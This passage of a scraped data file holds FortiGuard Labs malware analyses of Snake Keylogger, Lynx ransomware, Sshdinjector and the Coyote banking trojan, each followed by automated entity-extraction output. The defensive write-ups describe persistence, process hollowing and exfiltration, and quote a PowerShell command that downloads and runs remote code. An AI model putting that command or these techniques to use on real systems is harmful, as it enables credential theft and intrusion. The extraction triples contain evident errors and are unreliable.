Firefox by logging keystrokes, capturing credentials, and monitoring the clipboard. In addition to data theft, Snake Keylogger exfiltrates the stolen information to its command-and-control (C2) server using SMTP (email) and Telegram bots, allowing attackers to access stolen credentials and other sensitive data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FSAv5 features a new AI engine, PAIX, an advanced machine learning-powered system designed to detect and analyze previously unknown threats in real-time. By utilizing a blend of behavioral analysis and file attributes, PAIX can identify suspicious activity and potential malware before they affect your environment. Integrated into FortiSandbox devices, the engine is regularly updated with the latest AI models to ensure optimal protection. In the following sections, we will explore how FSAv5 detected this malware, the behavioral indicators it leveraged for identification, and Snake Keylogger's technique to evade detection and analysis. We will also examine how FortiSandbox’s advanced heuristics and machine learning models contribute to identifying and mitigating emerging keylogger threats. The AI engine in FSAv5 provides detailed static analysis, uncovering obfuscated strings and embedded APIs responsible for keylogging and credential harvesting. Additionally, FSAv5’s dynamic analysis capabilities captured the keylogger’s runtime behavior, including processes launched by the malware and the establishment of network connections to its command-and-control (C2) server. These insights revealed Snake Keylogger’s ability to exfiltrate stolen data while avoiding traditional detection mechanisms, further emphasizing the importance of FSAv5’s comprehensive malware analysis. Additionally, suspicious indicators triggered during the analysis were recorded and categorized (Figure 3). This comprehensive documentation provides further context and aids in identifying potential malicious activities. With the enhancements in FSAv5, these indicators not only document observed behaviors but also correlate them with specific MITRE ATT&CK techniques. This correlation provides a deeper understanding of the tactics employed by the malware. The integrated AI in FSAv5 performs static analysis, enabling it to detect malware without executing its code. As shown in Figure 4, the AI engine can efficiently identify potential threats by analyzing the malware’s code structure, embedded signatures, and other static properties. This new variant of Snake Keylogger employs AutoIt, a scripting language commonly used for automating tasks in the Windows environment, to deliver and execute its malicious payload. AutoIt is often leveraged by threat actors due to its versatility and ability to generate standalone executables that can bypass traditional antivirus solutions. In this variant of Snake Keylogger, the executable is an AutoIt-compiled binary, which adds an additional layer of obfuscation to hinder detection and analysis. The use of AutoIt not only complicates static analysis by embedding the payload within the compiled script but also enables dynamic behavior that mimics benign automation tools. Figure 5 shows the AutoIt encrypted script used for compiling the binary. The AI in FSAv5 identified these embedded malicious strings and API calls. Upon execution, Snake Keylogger drops a copy of itself to the %Local_AppData%\\supergroup folder under “ageless.exe,” setting its attributes to hidden. Once established in this directory, it drops another file into the %Startup% folder, named ageless.vbs. This script contains a command that utilizes WScript.Shell() to call the Run () method, executing ageless.exe and ensuring the malware runs automatically upon system startup. The ageless.vbs script, as captured and backed up by FSAv5 for analysis, is shown in Figure 6. Snake Keylogger copies the ageless.vbs file into the Startup folder as a persistence mechanism, ensuring that it automatically executes each time the infected system reboots. This method is commonly used because the Windows Startup folder allows scripts, executables, or shortcuts to run without required administrative privileges. By leveraging this technique, Snake Keylogger can maintain access to the compromised system and re-establish a foothold even if the malicious process is terminated. Figure 7 illustrates an indicator of Snake Keylogger employing this persistence method. Additionally, Figure 8 shows a screenshot of the ageless.vbs file placed in the Startup folder. After the execution of ageless.exe, the malware injects its malicious payload into a legitimate .NET process. The observed sample targets the RegSvcs.exe process using a technique known as process hollowing, which allows the malware to execute its code within a trusted process to evade detection. Process hollowing works by first spawning RegSvcs.exe in a suspended state, preventing it from executing its legitimate code. Next, the malware deallocates the original code section and allocates new memory space within the hollowed process. Finally, it writes its malicious payload into the newly allocated space. When the process resumes, RegSvcs.exe executes the injected malicious code. This method allows the malware to conceal its presence, making it significantly harder for traditional security tools to detect and remove. By embedding itself within a trusted process, Snake Keylogger can operate undetected and continue its malicious activities. Figure 9 shows an indicator with its corresponding risk score, highlighting the severity of the threat. Another FSAv5 indicator that provides valuable insights into the malware’s capabilities is its ability to detect when the folder storing browser-related login credentials and other sensitive data is accessed, as shown in Figure 10. This indicator offers critical clues about the malware’s intent and behavior, highlighting its potential to compromise user data. Snake Keylogger leverages various techniques to exfiltrate stolen credentials and gather additional information about the victim. One such method involves using websites like hxxp://checkip[.]dyndns[.]org to retrieve the victim’s geolocation, further enhancing its reconnaissance capabilities. Additionally, Snake Keylogger uploads stolen credentials through several channels, including SMTP and Telegram bots, using HTTP Post requests to securely transmit the data to its command-and-control server, as shown in Figure 11. The FortiSandbox research team analyzed the malware through reverse engineering and dynamic sandbox analysis, revealing the full scope of its malicious capabilities. Figures 12 and 13 show that the malware employs specialized modules to steal sensitive data from browser autofill systems, including credit card details. To capture keystrokes, it leverages the SetWindowsHookEx API with the first parameter set to WH_KEYBOARD_LL (flag 13), a low-level keyboard hook that monitors keystrokes (see Figure 14). This technique allows the malware to log sensitive input such as banking credentials. FortiSandbox plays a pivotal role in detecting and analyzing advanced malware threats like Snake Keylogger. Leveraging its innovative static and dynamic analysis capabilities and the power of its PAIX engine, FortiSandbox ensures the comprehensive detection of sophisticated threats. Capturing detailed indicators of compromise also empowers users to proactively safeguard their systems against evolving malware attacks, providing valuable insights for effective mitigation. TheFortiSandboxidentifies the malware mentioned in this report and any variations of it. It does not rely on updates fromFortiGuard Antivirus; instead, it utilizes the PAIX engine’s Machine Learning technology to detect previously unknown threats. FortiGuard Antivirus specifically detects the malware described in this report as AutoIt/Injector.GTY!tr. This service is integrated into FortiGate, FortiMail, FortiClient, and FortiEDR solutions, providing protection to customers using these products with up-to-date defenses. Additionally, the FortiGuard Web Filtering Service detects and blocks the command-and-control (C2) server. We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization. Please contact ourGlobal FortiGuard Incident Response Team. Command-and-Control (C2) Serverhttp://51[.]38[.]247[.]67:8081/_send_php?L [Original file]f8410bcd14256d6d355d7076a78c074f [ageless.exe]f8410bcd14256d6d355d7076a78c074f [ageless.vbs]77f8db41b320c0ba463c1b9b259cfd1b keylogger FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Snake Keylogger, Malware), (AutoIt/Injector.GTY!tr, Malware), (SMTP, Protocol), (Telegram, Service), (China, Region), (Turkey, Region), (Indonesia, Region), (Taiwan, Region), (Spain, Region), (Chrome, Browser), (Edge, Browser), (Firefox, Browser), (FortiSandbox v5.0 (FSAv5), Tool), (FortiGuard Labs Threat Research, Organization), (Windows, Platform), (Windows users, Party), (FortiGuard Labs, Organization), (high severity level, Severity Level)\nRelationships: (FortiGuard Labs, affectedPlatforms, Windows), (FortiGuard Labs, impactedParties, Windows users), (FortiGuard Labs, detectedMalware, Snake Keylogger), (FortiGuard Labs, leverages, FortiSandbox v5.0 (FSAv5)), (FortiGuard Labs, detects, AutoIt/Injector.GTY!tr), (FortiGuard Labs, impacts, China), (FortiGuard Labs, impacts, Turkey), (FortiGuard Labs, impacts, Indonesia), (FortiGuard Labs, impacts, Taiwan), (FortiGuard Labs, impacts, Spain), (FortiGuard Labs, leverages, SMTP), (FortiGuard Labs, leverages, Telegram), (FortiGuard Labs, detectedMalware",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Snake Keylogger",
          "Malware"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "Malware"
        ],
        [
          "SMTP",
          "Protocol"
        ],
        [
          "Telegram",
          "Service"
        ],
        [
          "China",
          "Region"
        ],
        [
          "Turkey",
          "Region"
        ],
        [
          "Indonesia",
          "Region"
        ],
        [
          "Taiwan",
          "Region"
        ],
        [
          "Spain",
          "Region"
        ],
        [
          "Chrome",
          "Browser"
        ],
        [
          "Edge",
          "Browser"
        ],
        [
          "Firefox",
          "Browser"
        ],
        [
          "FortiGuard Labs Threat Research",
          "Organization"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "Windows users",
          "Party"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "high severity level",
          "Severity Level"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "affectedPlatforms",
          "Windows"
        ],
        [
          "FortiGuard Labs",
          "impactedParties",
          "Windows users"
        ],
        [
          "FortiGuard Labs",
          "detectedMalware",
          "Snake Keylogger"
        ],
        [
          "FortiGuard Labs",
          "leverages",
          "FortiSandbox v5.0 (FSAv5"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "AutoIt/Injector.GTY!tr"
        ],
        [
          "FortiGuard Labs",
          "impacts",
          "China"
        ],
        [
          "FortiGuard Labs",
          "impacts",
          "Turkey"
        ],
        [
          "FortiGuard Labs",
          "impacts",
          "Indonesia"
        ],
        [
          "FortiGuard Labs",
          "impacts",
          "Taiwan"
        ],
        [
          "FortiGuard Labs",
          "impacts",
          "Spain"
        ],
        [
          "FortiGuard Labs",
          "leverages",
          "SMTP"
        ],
        [
          "FortiGuard Labs",
          "leverages",
          "Telegram"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 12
  },
  {
    "title": "Ransomware Roundup – Lynx",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-lynx",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Lynx ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the Lynx ransomware was made available on a publicly available file-scanning site in early July 2024, which coincides with other reports of its first availability. Our research found that the Lynx and INC ransomware, which first appeared in July 2023, look very similar. However, INC offers fewer options at the execution phase. We believe that INC ransomware is a predecessor to the Lynx ransomware. While INC ransomware is available for the Windows and ESXi platforms, we have not found a Lynx variant of the ransomware that affects non-Windows environments. The screenshot above shows the different options and functions an INC ransomware sample can perform. In contrast, the screenshot below shows what they are for a LYNX sample. LYNX ransomware offers more granular control than INC. Like most ransomware, INC and LYNX encrypt files on victims' Windows machines. Both families use the same encryption methods. Furthermore, both families modify the desktop background to display the ransom note. At the same time, both try to send the ransom note to connected printers. These can be seen in the following screenshots. Like other ransomware attacks, these demand a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the Lynx ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the Lynx ransomware takes the following line arguments: Option Description --file <filePath> Encrypt only specified file(s) --dir <dirPath> Encrypt only specified directory/directories --mode fast Encrypt 5% from entire file --mode medium Encrypt 15% from entire file (default) --mode slow Encrypt 25% from entire file --mode entire Encrypt 100% from entire file --help Print this message --verbose Enable verbosity --silent Enable silent encryption (no extension and notes will be added) --stop-processes Try to stop processes via RestartManager --encrypt-network Encrypt network shares --load-drives Load hidden drives (will corrupt boot loader) --hide-cmd Hide console window --no-background Don't change background image --no-print Don't print note on printers --kill Kill processes/services --safe-mode Enter safe-mode The Lynx ransomware always kills processes containing the following strings to maximize damage: It kills services that contain the following strings: The Lynx ransomware then encrypts files on the compromised machines and adds a file extension “.LYNX” to the affected files. The ransomware avoids encrypting files in the following folders: The Lynx ransomware avoids encrypting files with the following extensions: It also performs the following actions: The Lynx ransomware drops the following ransom note in “README.txt”: The ransomware then replaces the desktop wallpaper with the same ransom message. The oldest Lynx ransomware sample (SHA2: eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc) displays a slightly different ransom note. It contains different TOR sites and an attacker email address not found in other Lynx ransomware. The ransom note directs victims to a chat site operated by the attacker on TOR, where victims must first register with a unique ID. The Lynx ransomware has a data leak site that posts victim information, including data stolen from victims. As of this writing (January 29, 2025), the data leak site lists 96 victims, with the latest publication date being January 20, 2025. Our investigation found the following about the Lynx ransomware victims listed on the data leak site: Note that victims who paid the ransom may have been removed from the data leak site, and as such, additional companies may be affected by the Lynx ransomware. Separate from the aforementioned chat site, the Lynx ransomware group operates a data leak site on TOR. The Lynx ransomware group claims they have a policy to exclude “governmental institutions, hospitals, or non-profit organizations as these sectors play vital roles in society.” However, some victims listed on the data leak site are organizations believed to be in the healthcare and energy sectors. As with other ransomware groups, each victim has its own data leak page with a description of the stolen documents, the revenue of the victim organization, and the date the data was leaked. The Lynx ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Lynx Ransomware File IOCs SHA2 Note 31de5a766dca4eaae7b69f807ec06ae14d2ac48100e06a30e17cc9acccfd5193 Lynx ransomware 3e68e5742f998c5ba34c2130b2d89ca2a6c048feb6474bc81ff000e1eaed044e 432f549e9a2a76237133e9fe9b11fbb3d1a7e09904db5ccace29918e948529c6 468e3c2cb5b0bbc3004bbf5272f4ece5c979625f7623e6d71af5dc0929b89d6a 4e5b9ab271a1409be300e5f3fd90f934f317116f30b40eddc82a4dfd18366412 571f5de9dd0d509ed7e5242b9b7473c2b2cbb36ba64d38b32122a0a337d6cf8b 589ff3a5741336fa7c98dbcef4e8aecea347ea0f349b9949c6a5f6cd9d821a23 80908a51e403efd47b1d3689c3fb9447d3fb962d691d856b8b97581eefc0c441 85699c7180ad77f2ede0b15862bb7b51ad9df0478ed394866ac7fa9362bf5683 97c8f54d70e300c7d7e973c4b211da3c64c0f1c95770f663e04e35421dfb2ba0 9a47ab27d50df1faba1dc5777bdcfff576524424bc4a3364d33267bbcf8a3896 b378b7ef0f906358eec595777a50f9bb5cc7bb6635e0f031d65b818a26bdc4ee d5ca3e0e25d768769e4afda209aca1f563768dae79571a38e3070428f8adf031 eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc ecbfea3e7869166dd418f15387bc33ce46f2c72168f571071916b5054d7f6e49 f71fc818362b1465fc1deb361de36badc73ac4dd9e815153c9022f82c4062787 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Threat Research, Topic), (Ransomware Roundup, Publication), (Lynx ransomware, Malware), (INC ransomware, Malware), (Windows, Platform), (ESXi, Platform), (publicly available file-scanning site, Tool), (early July 2024, Date), (July 2023, Date), (high severity level, Severity Level)\nRelationships: (FortiGuard Labs, publishes, Ransomware Roundup), (Ransomware Roundup, contains, Lynx ransomware), (Ransomware Roundup, contains, INC ransomware), (Lynx ransomware, affectedPlatforms, Windows), (Lynx ransomware, affectedPlatforms, ESXi), (INC ransomware, affectedPlatforms, Windows), (INC ransomware, affectedPlatforms, ESXi)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Threat Research",
          "Topic"
        ],
        [
          "Ransomware Roundup",
          "Publication"
        ],
        [
          "Lynx ransomware",
          "Malware"
        ],
        [
          "INC ransomware",
          "Malware"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "ESXi",
          "Platform"
        ],
        [
          "publicly available file-scanning site",
          "Tool"
        ],
        [
          "early July 2024",
          "Date"
        ],
        [
          "July 2023",
          "Date"
        ],
        [
          "high severity level",
          "Severity Level"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "Ransomware Roundup"
        ],
        [
          "Ransomware Roundup",
          "contains",
          "Lynx ransomware"
        ],
        [
          "Ransomware Roundup",
          "contains",
          "INC ransomware"
        ],
        [
          "Lynx ransomware",
          "affectedPlatforms",
          "Windows"
        ],
        [
          "Lynx ransomware",
          "affectedPlatforms",
          "ESXi"
        ],
        [
          "INC ransomware",
          "affectedPlatforms",
          "Windows"
        ],
        [
          "INC ransomware",
          "affectedPlatforms",
          "ESXi"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 7
  },
  {
    "title": "Analyzing ELF/Sshdinjector. A!tr with a Human and Artificial Analyst",
    "link": "https://www.fortinet.com/blog/threat-research/analyzing-elf-sshdinjector-with-a-human-and-artificial-analyst",
    "content": "FortiGuard Labs Threat Research Affected Platform:LinuxImpacted Users:Linux-based network appliances or IoTImpact:Data exfiltrationSeverity Level:Medium ELF/Sshdinjector.A!tris a collection of malware that can be injected into the SSH daemon. Samples of this malware collection surfaced around mid-November 2024. While we have a good amount of threat intelligence on them (e.g., they areattributed to theDaggerFlyespionage group), nobody seems to have looked into what they actually do. In this blog post, we will focus on the reverse engineering of the attack’s binaries and how this reverse engineering was achieved. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack uses several binaries: More precisely, the dropper checks if it is being run under root privileges and, if not, exits. It then checks whether the host is infected by searching for a file named/bin/lsxxxssswwdd11vv containingthe wordWATERDROP. If the host is not yet infected, it attempts to overwrite the legitimate binariesls,netstat,andcrondwith infected binaries (/bin/lsxxxssswwdd11vv,selfrecoverheader,mainpasteheade,r…). Finally, it searches the SSH daemon and, if necessary, infects it withlibsshd.so. The malicious payload is contained inlibsshd.so. The main element is found in a function named “haha.” It also creates two other threads from the functions “heihei” and “xixi”. Those three names refer to laughing in Chinese. Function “xixi” checks whether it has access to/root/intensify-mm-inject/xxx, in which case it will kill and restart both the SSH and Cron daemons. Function “heihei” connects to the remote C2 (hard-coded IP address 45.125.64[.]200, port 33200 or 33223) and listens for incoming commands. Command Id Description 1 SERVER_REQ_BASE_INFO. Exfiltrates uname, MAC address etc to C2 2 List running services, by listing files in/etc/init.d 3 Reads users from/etc/shadow 4 Lists running process 5 Tests access to/var/log/dmesg 6 Tests access to/tmp/fcontr.xml 7 Lists a given directory 8 File transfer 9 Opens a shell terminal 10 Executes a command in the terminal 11 Unloads and exits the malicious process 12 Removes a file 13 Renames a file 1000 SERVER_RET_ONLINE_ACK 0x80000001 Client status change notification. It sends base info, service list, read/etc/shadow. Communication with the C2 uses its own protocol. All packets include a hard-coded UUID (a273079c-3e0f-4847-a075-b4e1f9549e88), an identifier (afa8dcd81a854144), and the response to the command. Reverse engineering was performed using Radare2, assisted by Generative AI through theRadare2 extension“r2ai.” This study shows that AI provides excellent insights into the malware, delivering high-quality source code that complements the output obtained from a standard decompiler. For example, I usedr2ai in “auto” mode. In this mode, the user asks the AI a question, and the AI automatically performs the necessary steps with the radare2 disassembler to answer. This is particularly helpful for users who don’t know Radare2 well. In this screenshot, we see the AI automatically searches for strings in the binary, via r2’s command “iz”. The overview of the dropper is excellent.AI excels in reading large quantities of information and summarizing them. We can then ask the AI to decompile the main.While the AI-generated source code is easy to understand, its details are not always correct. By comparison, source code produced by decompilers is often difficult to read but is accurate. Because of this, it is important to remember that these approaches complement each other and are ideally viewed side by side. While AI performs very well, there are many cases in which it does not produce a satisfactory answer, at least not at first. The most common issue ishallucination, wherein the AIinventssomething that isn’t true. Worse, it’s not always easy for a human analyst to spot hallucinations because the AI can sound very convincing. For example, in the AI-generated code below, the AI completely created an upload and a download command that is pure invention. Another frequent issue isextrapolation, where the AI does not totally invent something butextrapolatesit. For example, the AI says the malware “manipulates” the MAC address. This is far-fetched. While itcreatesa string containing the host's MAC address and exfiltrates it, there is no modification of the MAC address. In a related example, the AI claims the malware hides its network communications. It does not. It hides on the OS by infecting common binaries such as netstat, but it does not attempt to hide the communication itself. Yet another issue isomissions. Omissions are the downside of AI’s power to summarize situations. Its summaries often lack the details a human would find important. For example, at some point, the malware tests access to a file named/tmp/fcontr.xml. Despite this being absolutely clear in the assembly,the first version of AI-generated code completely eluded this part. The solution to this issue is toask again by modifying the question/prompt for the AI. In this case, I simply added to the end of the prompt: “Please pay attention to what is around fcontr.xml” and it solved the problem. Of course, this requires knowing that something had been omitted in the first place. In fact,interactions with AI are seldom perfect in a single shot. Rather, they could be compared to a discussion with a capable colleague with impressive knowledge and intelligence but less intuition and experience. For this research, I kept my disassembler open. I used it several times to check for hallucinations, assist the AI (!) when it failed to find correct addresses or cross-references, or guide it to look into interesting parts. While disassemblers and decompilers have improved over the last decade, this cannot be compared to the level of innovation we are seeing with AI. This isoutstanding! AI is particularly good at providing overviews of samples and generating easy-to-understand source code.Fortunately—or not?—AI cannot workalone and must be piloted and complemented by competent human analysis to spot hallucinations(the most dangerous issues),refine questions, identify omissions, or guidethe AI in the most interesting direction. I haven’t discussedlanguage models yet. Obviously, r2ai’s results depend on the language model used. Language models are configurable, and we can conveniently switch from one to another, whether a local model or a remote one, free access or paid. The results from this article were mainly obtained using Claude 3.5 Sonnet 2024-10-22. Last but not least, this blog post was  written without AI assistance ;-) Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: ELF/Sshdinjector.A!tr and Linux/Agent.ACQ!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 94e8540ea39893b6be910cfee0331766e4a199684b0360e367741facca74191f 0e2ed47c0a1ba3e1f07711fb90ac8d79cb3af43e82aa4151e5c7d210c96baebb 6d08ba82bb61b0910a06a71a61b38e720d88f556c527b8463a11c1b68287ce84 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (LinuxImpacted, Threat Type), (Linux-based network appliances or IoT, Device), (Data exfiltration, Impact), (Medium, Severity Level), (ELF/Sshdinjector.A!tris, Malware), (elf, File), (ssh, Tool), (root, Privilege), (host, Target), (infected, Status), (file, File), (waterdrop, Vulnerability), (linux, OS), (mid-november 2024, Date), (attackers, Attacker), (global threat landscape report, Report), (reverse engineering, Technique), (libsshd.so, File), (main element, Element), (function, Function), (thread, Thread), (haha, Function), (heihei, Function), (xixi, Function)\nRelationships: (FortiGuard Labs Threat Research, uses, LinuxImpacted), (LinuxImpacted, contains, ELF/Sshdinjector.A!tris), (Linux-based network appliances or IoT, affectedBy, Data exfiltration), (Data exfiltration, causedBy, Medium), (Medium, severityOf, ELF/Sshdinjector.A!tris), (ELF/Sshdinjector.A!tris, isA, Malware), (Malware, isA, elf), (SSHdaemon, interactsWith, libsshd.so",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "LinuxImpacted",
          "Threat Type"
        ],
        [
          "Linux-based network appliances or IoT",
          "Device"
        ],
        [
          "Data exfiltration",
          "Impact"
        ],
        [
          "Medium",
          "Severity Level"
        ],
        [
          "ELF/Sshdinjector.A!tris",
          "Malware"
        ],
        [
          "elf",
          "File"
        ],
        [
          "ssh",
          "Tool"
        ],
        [
          "root",
          "Privilege"
        ],
        [
          "host",
          "Target"
        ],
        [
          "infected",
          "Status"
        ],
        [
          "file",
          "File"
        ],
        [
          "waterdrop",
          "Vulnerability"
        ],
        [
          "linux",
          "OS"
        ],
        [
          "mid-november 2024",
          "Date"
        ],
        [
          "attackers",
          "Attacker"
        ],
        [
          "global threat landscape report",
          "Report"
        ],
        [
          "reverse engineering",
          "Technique"
        ],
        [
          "libsshd.so",
          "File"
        ],
        [
          "main element",
          "Element"
        ],
        [
          "function",
          "Function"
        ],
        [
          "thread",
          "Thread"
        ],
        [
          "haha",
          "Function"
        ],
        [
          "heihei",
          "Function"
        ],
        [
          "xixi",
          "Function"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "LinuxImpacted"
        ],
        [
          "LinuxImpacted",
          "contains",
          "ELF/Sshdinjector.A!tris"
        ],
        [
          "Linux-based network appliances or IoT",
          "affectedBy",
          "Data exfiltration"
        ],
        [
          "Data exfiltration",
          "causedBy",
          "Medium"
        ],
        [
          "Medium",
          "severityOf",
          "ELF/Sshdinjector.A!tris"
        ],
        [
          "ELF/Sshdinjector.A!tris",
          "isA",
          "Malware"
        ],
        [
          "Malware",
          "isA",
          "elf"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 25,
    "relationship_count": 7
  },
  {
    "title": "Coyote Banking Trojan: A Stealthy Attack via LNK Files",
    "link": "https://www.fortinet.com/blog/threat-research/coyote-banking-trojan-a-stealthy-attack-via-lnk-files",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High Over the past month, FortiGuard Labs has identified several similar LNK files containing PowerShell commands designed to execute malicious scripts and connect to remote servers. These files are part of multi-stage operations that ultimately deliver the Coyote Banking Trojan. This malware primarily targets users in Brazil, seeking to harvest sensitive information from over 70 financial applications and numerous websites. Once deployed, the Coyote Banking Trojan can carry out various malicious activities, including keylogging, capturing screenshots, and displaying phishing overlays to steal sensitive credentials. In this article, we will detail the behavior of each stage. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c “Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri ‘hxxps://tbet[.]geontrigame[.]com/zxchzzmism’ -UseBasicParsing).Content }; Start-Sleep 131.” We analyzed multiple malicious files by examining the “Machine ID” embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote. URLs in Arguments Machine ID MAC Address hxxps://tbet.geontrigame[.]com/zxchzzmism 0cb44b707681 aa:1c:b2:83:1d:72 hxxps://hrod.geontrigame[.]com/edsfluzevj a8025a01fc56 f5:12:59:16:ba:f7 hxxps://easi.geontrigame[.]com/wydqfchssb a8025a01fc56 f5:12:59:16:ba:f7 hxxps://iivi.geontrigame[.]com/zkrghotqvy a8025a01fc56 f5:12:59:16:ba:f7 hxxps://cuzo.geontrigame[.]com/pxylqhpuiv a8025a01fc56 f5:12:59:16:ba:f7 hxxps://btee.geontrigame[.]com/mvkrouhawm dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://qmnw.daowsistem[.]com/fayikyeund dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://bhju.daowsistem[.]com/iwywybzqxk dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://lgfd.daowsistem[.]com/riqojhyvnr dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://leme.daowsistem[.]com/omzowcicwp dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://igow.scortma[.]com/fqieghffbm dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://quit.scortma[.]com/xzcpnnfhxi dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://llue.geontrigame[.]com/byyyfydxyf dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://cxmp.scortma[.]com/qfutdbtqqu dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://xrxw.scortma[.]com/gmdroacyvi dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://qfab.geontrigame[.]com/vfofnzihsm dc0bfa46899d e8:a5:d6:6a:57:02 The content in “zxchzzmism” is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation. The “bmwiMcDec” DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the “npuGDec” payload. It then employs 